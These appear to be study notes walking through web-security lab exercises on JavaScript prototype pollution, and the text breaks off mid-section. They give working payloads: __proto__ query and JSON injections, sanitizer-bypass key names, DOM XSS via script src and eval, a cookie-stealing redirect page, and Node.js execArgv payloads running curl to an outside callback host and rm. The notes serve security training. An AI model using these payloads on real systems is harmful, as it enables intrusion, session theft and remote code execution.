# Prototype Pollution

Prototype pollution is a JavaScript security bug where an attacker injects or changes properties on Object.prototype (the base object every normal object inherits from). Because most objects inherit from that prototype, changing it can silently change app behavior and lead to serious issues — often remote code execution, data tampering, or DOM XSS in browsers.



## How it works (simple steps)
- JavaScript objects inherit from Object.prototype.
	- Example: {} → inherits properties from Object.prototype.
- If an attacker can control a property name like __proto__ or constructor.prototype through user input (query strings, JSON, form fields), they can change that prototype.
- After pollution, any object that checks or uses the polluted property will see the attacker-controlled value.

Example payloads:
- Query-string style: /?__proto__[isAdmin]=true
- JSON-like (if an app naively merges user JSON into config): ``` {"__proto__":{"role":"admin"}} ```
```js
// before
Object.prototype.marker // undefined

// attacker injects ?__proto__[marker]=owned
Object.prototype.marker // "owned"
({}).marker             // "owned"  <-- every object now has marker

```

## Lab: Client-side prototype pollution via browser APIs

- Goal: Exploit client-side prototype pollution to trigger a DOM XSS (script.src) sink.

Manual approach

- Find pollution source: Inject into query string 
	- 	/?__proto__[foo]=bar and verify Object.prototype.foo appears in the browser console.
- Identify gadget: Inspect site scripts (Sources). 
	-	In searchLoggerConfigurable.js a transport_url is dynamically appended as a <script> but was made non-writable/unconfigurable with Object.defineProperty() without defining a value property — this creates a gadget that reads value.
- Exploit: Pollute prototype so the gadget picks up a value property: 
	-	/?__proto__[value]=data:,alert(1); — the page renders <script src="data:,alert(1);"> and alert(1) runs, solving the lab.

DOM Invader (Burp) approach

	- Load lab in Burp browser, enable DOM Invader with prototype-pollution option.
	- Reload; DOM Invader finds prototype-pollution vectors in the query string.
	- Click Scan for gadgets → DOM Invader locates the value gadget and the script.src sink.
	- Click Exploit → DOM Invader auto-generates the POC and triggers alert(1).
Key takeaway: Prototype pollution via __proto__ can inject properties that interact with existing DOM-creating gadgets (e.g., script insertion) to achieve DOM XSS.


---


## Lab:  DOM XSS via client-side prototype pollution

Goal: Use prototype pollution to control a script src and trigger DOM XSS.

Manual steps (quick):

-	Find pollution vector: Inject into query string:
	-	/?__proto__[foo]=bar → confirm Object.prototype.foo === "bar" in DevTools Console.
-	Identify gadget: Inspect site scripts (Sources). 
	-	searchLogger.js will append a <script> if config.transport_url exists — a potential gadget if that property is read later.
-	Exploit: Pollute the prototype with transport_url:
	-	/?__proto__[transport_url]=data:,alert(1);
	Check Elements — a <script src="data:,alert(1);"> appears and alert(1) runs. Lab solved.

Automated (Burp DOM Invader):

	- Load lab in Burp browser → enable DOM Invader + prototype-pollution.
	- Reload: it finds pollution vectors in the query string.
	- Click Scan for gadgets → it finds the transport_url gadget and the script.src sink.
	- Click Exploit → DOM Invader generates a POC and triggers alert(1).

Key takeaway: Polluting __proto__ can inject properties (like transport_url) that existing client-side code uses to create DOM elements (e.g., script tags), enabling DOM XSS.

---

## Lab: DOM XSS via an alternative prototype pollution vector

Goal: Exploit prototype pollution to inject malicious JavaScript into an eval() sink.

Manual solution

- Find prototype pollution source:

	- Test /?__proto__[foo]=bar → no effect.

	- Try /?__proto__.foo=bar → success (Object.prototype.foo now equals "bar").

- Identify gadget:

	- In searchLoggerAlternative.js, an eval() sink uses manager.sequence, which isn’t defined — potential gadget.

- Craft exploit:

	- Inject payload:
		- /?__proto__.sequence=alert(1)
		- → error occurs, showing alert(1)1 (extra “1” breaks syntax).

	- Fix syntax by appending a minus:
		- /?__proto__.sequence=alert(1)-
		- → valid JS, triggers alert(1) and solves the lab.

DOM Invader solution

	- Enable prototype pollution option and reload page.
	- DOM Invader detects pollution vector in query string.
	- Scan for gadgets → finds eval() sink via sequence property.
	- Generated PoC fails initially due to the trailing 1 in payload.
	- Manually append - to the payload in URL → alert(1) executes successfully.



Key takeaway:
	- By polluting Object.prototype with a property used by an eval() sink, you can inject and execute JavaScript (DOM XSS). Sometimes, syntax adjustments (like adding -) are needed to fix malformed payloads.

---

## Lab: Client-side prototype pollution via flawed sanitization

Goal: Bypass the app’s key-sanitization to pollute Object.prototype, then control a script.src gadget to trigger DOM XSS.

How the bypass works :

- Simple __proto__ or constructor.prototype attempts are blocked by the site’s sanitizeKey() blocklist, so /?__proto__.foo=bar and similar fail.

- The filter isn’t recursive and can be bypassed by obfuscating the blocked key so the sanitizer misses it but the parser still interprets it. Example bypass forms used:

	- /?__pro__proto__to__[foo]=bar
	- /?__pro__proto__to__.foo=bar
	- /?constconstructorructor[protoprototypetype][foo]=bar
	- /?constconstructorructor.protoprototypetype.foo=bar

- After injecting one of those, Object.prototype.foo === "bar" — prototype pollution achieved.

Finding the gadget:

- Inspect site JS. searchLogger.js dynamically appends a <script> using config.transport_url if present.

- config.transport_url is not normally defined — a perfect gadget if you can supply it through the polluted prototype.

Exploit (POC):

- Pollute the prototype with transport_url:
	- /?__pro__proto__to__[transport_url]=data:,alert(1);

- The page renders <script src="data:,alert(1);"> and alert(1) executes → lab solved.

Key takeaway: Even when direct __proto__ keys are blocked, non-recursive sanitizers can be bypassed by tricking the parser with obfuscated key names. If client-side code later reads a property (e.g., transport_url) to build DOM (script.src), that polluted property can be used to trigger DOM XSS.


---

## Lab: Client-side prototype pollution in third-party libraries

Goal: Use prototype pollution delivered in the URL fragment (#...) to control a setTimeout() sink (hitCallback) and execute code (steal cookie).


- Load the lab in Burp’s built-in browser.
- Enable DOM Invader and turn on the prototype pollution option.
- Open DevTools → DOM Invader tab and reload the page. DOM Invader finds two pollution vectors in the URL hash (fragment).
- Click Scan for gadgets → wait for the gadget scan. It finds a hitCallback gadget that reaches a setTimeout() sink.
- Click Exploit → DOM Invader auto-generates a POC and runs alert(1) (proof the sink is exploitable).
- Disable DOM Invader.
- On the lab’s exploit server, create an HTML payload that navigates victims to a malicious URL containing the polluted hash. Example body:

```html
<script>
  location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
</script>

```
- Test the exploit yourself (confirm navigation and that alert(document.cookie) runs).
- Deliver the exploit to a victim to solve the lab.

Key takeaway: Prototype pollution delivered via the URL fragment can be discovered and weaponized with DOM Invader. If a gadget (here hitCallback) feeds attacker-controlled properties into DOM timers (setTimeout), you can execute arbitrary JS (e.g., alert(document.cookie)) by getting the victim to visit a crafted URL.

---

## Lab: Privilege escalation via server-side prototype pollution

Goal: Pollute server-side object prototype via a JSON request to become an admin and delete the carlos user


- Inspect address update: Log in, submit the account address form. In Burp HTTP history find the POST /my-account/change-address request — the form data is sent as JSON and the server responds with a JSON user object.

- Prototype pollution test: Send the request to Repeater and add:
	```json
	"__proto__": { "foo": "bar" }

	```
	- Send it — the response user object now shows foo: "bar" (but no __proto__), indicating prototype pollution (inherited property).

- Find gadget: The response has isAdmin: false — this property is read by the app to show admin links.

- Exploit: Modify JSON to:
	```json
	"__proto__": { "isAdmin": true }

	```
Key takeaway: Untrusted JSON merged into server-side objects can pollute Object.prototype. If the app relies on properties like isAdmin from user objects, prototype pollution lets an attacker escalate privileges.

---

## Lab: Detecting server-side prototype pollution without polluted property reflection

- Log into the account page and submit the change-address form while capturing the POST /my-account/change-address in Burp Proxy.

- Send the request to Burp Repeater and note the server exchanges JSON representing the user.

- Add an injected : 
	```__proto__ property (e.g. {"__proto":{"foo":"bar"}}) ``` and resend — response may not immediately show the injected field.

- Intentionally break the JSON to get an error response (500) whose error object contains a status: 400.

- Restore valid JSON, change the injected __proto__ to include a custom status (must be between 400–599), e.g. ``` {"__proto":{"status":555}},``` and resend — get normal user response.

- Break the JSON again; this time the error object’s status/statusCode reflect the injected value from Object.prototype, confirming prototype pollution and solving the lab.

One-line takeaway: use __proto__ injection plus triggering an error path to prove Object.prototype was polluted (observed via modified error status).

---



##

- Log in, update your address, and capture the POST /my-account/change-address request in Burp.

- Send it to Repeater and test prototype pollution by injecting:
```json
"__proto__": { "json spaces": 10 }

```

- Visit the admin panel and note that running maintenance jobs likely spawns Node.js child processes.

- Exploit this by injecting:
```json
"__proto__": {
    "execArgv": ["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"]
}

```
Trigger maintenance jobs — the Burp Collaborator receives DNS hits, confirming remote code execution (RCE).


- Finally, replace the payload with:
```json
"__proto__": {
    "execArgv": ["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]
}

```
Trigger the jobs again — Carlos’s file is deleted, solving the lab.

In short: Prototype pollution via __proto__ leads to Node.js RCE by manipulating execArgv, enabling arbitrary command execution and file deletion.

---


Study the Address Change Feature

	- Log in and update your address via the account page.
	- In Burp Suite, locate the POST /my-account/change-address request.
	- Observe the JSON response reflecting the updated address.

Identify Prototype Pollution

	- Send the request to Burp Repeater.
	- Inject a __proto__ property with 
	```json
	{"json spaces":10}.
	```
	- Confirm prototype pollution by observing increased JSON indentation in the response.

Trigger Remote Code Execution (RCE)

	- Go to the admin panel and trigger maintenance jobs.
	- Inject malicious properties into __proto__ to exploit child_process.execSync():
